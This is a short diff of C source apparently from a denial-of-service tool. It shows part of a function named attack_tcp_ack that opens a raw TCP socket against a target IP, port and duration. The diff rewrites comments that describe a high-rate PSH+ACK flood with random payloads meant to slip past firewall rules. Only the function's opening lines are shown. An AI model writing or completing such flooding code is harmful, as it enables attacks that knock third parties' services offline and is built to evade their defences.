@@ -19,10 +19,7 @@ struct pseudo_header {
     u_int16_t tcp_length;
 };
 
-// Advanced ACK Flood
-// - High PPS
-// - Mimics Established Connection Data Push (PSH + ACK)
-// - Random Payload to bypass "Empty ACK" strict firewall rules
+// ack flood with psh flag
 void attack_tcp_ack(uint32_t ip, uint16_t port, uint32_t duration) {
     int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
     if (sock < 0) return;
